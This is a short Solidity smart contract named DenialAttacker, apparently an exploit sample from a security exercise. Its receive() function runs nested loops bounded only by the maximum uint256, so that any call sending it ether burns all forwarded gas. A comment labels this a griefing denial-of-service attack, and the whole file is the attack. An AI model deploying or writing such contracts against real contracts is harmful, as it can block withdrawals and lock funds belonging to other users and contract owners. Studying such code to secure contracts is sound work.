// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialAttacker {
    receive() external payable {
        // Deplete the gas => GRIEFING ATTACK (DOS)
        uint256 count;
        for (uint256 i = 1; i < type(uint256).max; i++) {
            count = (i % 100) + 1;
            for (uint256 j = 1; j < type(uint256).max; j++) {
                count = (j % 100) + 1;
            }
        }
    }
}
